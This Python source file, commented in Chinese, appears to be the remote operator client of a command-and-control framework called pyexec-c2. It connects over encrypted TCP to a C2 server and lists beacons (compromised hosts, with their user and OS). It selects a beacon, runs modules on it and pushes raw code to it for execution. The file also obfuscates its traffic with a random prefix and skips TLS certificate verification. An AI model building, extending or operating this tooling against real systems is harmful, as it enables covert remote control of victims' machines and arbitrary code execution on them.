"""flowscan/c2_remote.py — C2 远程模式：以 client 协议连接远端独立 server。

界面以 client 模式连到另一台服务器上单独启动的 C2 server 的 client 端口
（config.json client_port，默认 65504），把页面操作翻译成 console 命令
（beacons / use / <模块> / show / result / modules / raw）发送执行。

实现 = 原版 pyexec-c2 client/remote_client.py 逻辑（加密 TCP + COMMAND/
RESPONSE 往返）+ beacons/modules 文本输出解析 + 模块级单例管理。

依赖: c2_server.core.protocol 的帧函数与消息常量(与 c2_bridge 同法注册
server 别名)。连接凭证(client_key)不落盘,仅存内存。
"""

import importlib
import json
import re
import secrets
import socket
import sys
import threading
import time
from datetime import datetime, timezone
from typing import Optional

sys.modules.setdefault("server", importlib.import_module("c2_server"))

from server.core.protocol import (
    send_frame, recv_frame, COMMAND, RESPONSE, ERROR,
    REGISTER, WELCOME, PROTOCOL_VERSION,
)

# ── 单例状态(全部在内存,不落盘) ──
_lock = threading.Lock()
_client: Optional["RemoteClient"] = None
_state = {"connected": False, "url": "", "error": "", "connected_at": ""}


class RemoteClient:
    """加密 TCP 连接到远端 Server client 端口的 Client（原版逻辑）。"""

    def __init__(self, server_host: str, client_port: int,
                 client_key_hex: str, client_tls: bool = False):
        self._host = server_host
        self._port = client_port
        self._key_hex = client_key_hex or ""
        self._tls = client_tls
        self._key: Optional[bytes] = None
        self._sock: Optional[socket.socket] = None
        self._lock = threading.Lock()
        self._error = ""
        if not self._key_hex or len(self._key_hex) != 64:
            self._error = ("client_key 无效(需要 64 字符 hex)。请在远端 server "
                           "上执行 s_exec keygen 生成 client_key 并同步。")
        else:
            try:
                self._key = bytes.fromhex(self._key_hex)
            except ValueError:
                self._error = "client_key 不是合法 hex"

    @property
    def error(self) -> str:
        return self._error

    def connect(self) -> bool:
        """连接远端 Server 并注册为 Client（含握手响应校验）。"""
        if self._key is None:
            return False
        try:
            sock = socket.create_connection((self._host, self._port), timeout=10)
            if self._tls:
                import ssl
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE  # 自签证书：防被动嗅探
                sock = ctx.wrap_socket(sock, server_hostname=self._host)
            sock.settimeout(30)
            # 流量混淆: TCP 直连通道连接首包为 256B 随机前缀(服务端 handshake 吞掉)
            sock.sendall(secrets.token_bytes(256))
            reg = {
                "type": REGISTER, "version": PROTOCOL_VERSION,
                "role": "client",
                "id": f"client_{socket.gethostname()}_{time.time():.0f}",
            }
            send_frame(sock, json.dumps(reg).encode("utf-8"), self._key)
            resp = json.loads(recv_frame(sock, self._key).decode("utf-8"))
            if resp.get("type") == ERROR:
                self._error = f"server rejected: {resp.get('message')}"
                sock.close()
                return False
            if resp.get("type") != WELCOME:
                self._error = f"unexpected handshake: {resp.get('type')}"
                sock.close()
                return False
            self._sock = sock
            self._error = ""
            return True
        except Exception as e:
            self._error = str(e)
            return False

    def send_command(self, line: str) -> dict:
        """发送一条 console 命令，返回响应 dict。

        断线自动重连；失败返回 {"status": "error", "error": ...}。
        """
        with self._lock:
            if self._sock is None and not self.connect():
                return {"status": "error",
                        "error": self._error or "connection failed"}
            try:
                msg = {"type": COMMAND, "line": line}
                send_frame(self._sock, json.dumps(msg).encode("utf-8"),
                           self._key)
                raw = recv_frame(self._sock, self._key)
                return json.loads(raw.decode("utf-8"))
            except Exception as e:
                self._sock = None
                return {"status": "error", "error": str(e)}

    def close(self) -> None:
        with self._lock:
            if self._sock:
                try:
                    self._sock.close()
                except OSError:
                    pass
                self._sock = None


# ── 输出解析 ──
_ID_RE = re.compile(r"^([0-9a-f]{16})")


def _parse_beacons(output: str) -> list:
    """解析 `beacons` 表格输出 → [{client_id, sys_user, sys_platform,
    sys_os, tags, is_fork, current}]。表头行/空行跳过。"""
    out = []
    for line in (output or "").splitlines():
        line = line.rstrip("\n")
        m = _ID_RE.match(line)
        if not m or "ID" in line[:20] and "Fork" in line:
            continue
        bid = m.group(1)
        rest = line[16:]
        # 列布局(beacon 命令,字段间有空格): " " Fork<5 " " Tag<10 " " Last<8 " " User<14 " " Plat<8 " " OS<22
        def col(start, width):
            return rest[start:start + width].strip()
        fork = col(3, 5)
        tag = col(9, 10)
        user = col(29, 14)
        plat = col(44, 8)
        os_ = col(53, 22)
        current = rest.rstrip().endswith("*")
        out.append({
            "client_id": bid,
            "sys_user": user,
            "sys_platform": plat,
            "sys_os": os_,
            "tags": [t for t in tag.split(",") if t],
            "is_fork": fork == "fork",
            "current": current,
            "last_seen": rest[20:28].strip(),
        })
    return out


def _parse_modules(output: str) -> list:
    """解析 `modules` 输出 → [{name, type, desc, params}]。"""
    out = []
    for line in (output or "").splitlines():
        m = re.match(r"^\s{2}(\S+)\s+\((\w+)\)(.*?)\s*-\s*(.*)$", line)
        if not m:
            continue
        params = []
        pm = re.search(r"\[([^\]]+)\]", m.group(3))
        if pm:
            params = [p.strip() for p in pm.group(1).split(",") if p.strip()]
        out.append({"name": m.group(1), "type": m.group(2),
                    "desc": m.group(4), "params": params})
    return out


# ── 单例管理 ──

def _parse_url(url: str):
    """解析用户输入的远端地址: host:port 或 http(s)://host:port。"""
    url = (url or "").strip()
    tls = False
    m = re.match(r"^(https?)://", url)
    if m:
        tls = m.group(1) == "https"
        url = url[m.end():]
    if "://" in url:
        raise ValueError("URL 格式: host:port 或 https://host:port")
    if ":" in url:
        host, port_s = url.rsplit(":", 1)
    else:
        host, port_s = url, ""
    if not host:
        raise ValueError("地址不能为空")
    port = int(port_s or 65504)
    if not (1 <= port <= 65535):
        raise ValueError("端口非法")
    return host, port, tls


def connect(url: str, key: str) -> tuple:
    """建立远程连接。成功返回 (True, 提示)；失败 (False, 错误)。"""
    global _client
    with _lock:
        try:
            host, port, tls = _parse_url(url)
        except ValueError as e:
            return False, str(e)
        key = (key or "").strip()
        if not key or len(key) != 64:
            return False, "密钥需为 64 字符 hex（远端 server 的 client_key，s_exec keygen 生成）"
        try:
            bytes.fromhex(key)
        except ValueError:
            return False, "密钥不是合法 hex"
        c = RemoteClient(host, port, key, tls)
        if not c.connect():
            err = c.error or "连接失败"
            return False, f"连接失败: {err}"
        _client = c
        _state.update({
            "connected": True,
            "url": f"{host}:{port}",
            "error": "",
            "connected_at": datetime.now(timezone.utc).strftime(
                "%Y-%m-%dT%H:%M:%SZ"),
        })
        return True, f"已连接 {host}:{port}（client 模式）"


def disconnect() -> tuple:
    global _client
    with _lock:
        if _client is not None:
            try:
                _client.close()
            except Exception:
                pass
            _client = None
        was = _state.get("connected")
        _state.update({"connected": False, "url": "", "error": "",
                       "connected_at": ""})
        return True, "已断开" if was else "（未连接）"


def status() -> dict:
    with _lock:
        return dict(_state)


def command(line: str) -> tuple:
    """发送一条 console 命令到远端。返回 (ok, output|error)。"""
    with _lock:
        c = _client
        if c is None:
            return False, "未连接远端 server（请先远程模式连接）"
        resp = c.send_command(line)
        if resp.get("type") == RESPONSE:
            return True, resp.get("output", "")
        return False, resp.get("error") or "远端无响应"


def list_beacons() -> tuple:
    ok_, out = command("beacon")
    if not ok_:
        return False, out
    if "(no beacons" in out:
        return True, []
    return True, _parse_beacons(out)


def beacon_detail(client_id: str) -> tuple:
    """远端 beacon 详情 + 最近结果（文本,前端直接展示）。"""
    ok_, out = command(f"show {client_id}")
    if not ok_:
        return False, out
    ok2, out2 = command(f"result {client_id}")
    if ok2 and "(no results)" not in out2:
        out = out + "\n\n" + out2
    return True, out


def list_modules() -> tuple:
    ok_, out = command("modules")
    if not ok_:
        return False, out
    if "(no modules" in out:
        return True, []
    return True, _parse_modules(out)


def exec_module(client_id: str, name: str, args: list) -> tuple:
    """远端执行模块: use <bid> + <name> <args> 两条命令。"""
    ok_, out = command(f"use {client_id}")
    if not ok_:
        return False, out
    if not name:
        return False, "未指定模块"
    line = name if not args else f"{name} {' '.join(args)}"
    return command(line)


def push_raw(client_id: str, code: str) -> tuple:
    """远端下发原始代码。"""
    return command(f"raw {client_id} {code}")


def remote_ok() -> bool:
    with _lock:
        return _state.get("connected") and _client is not None
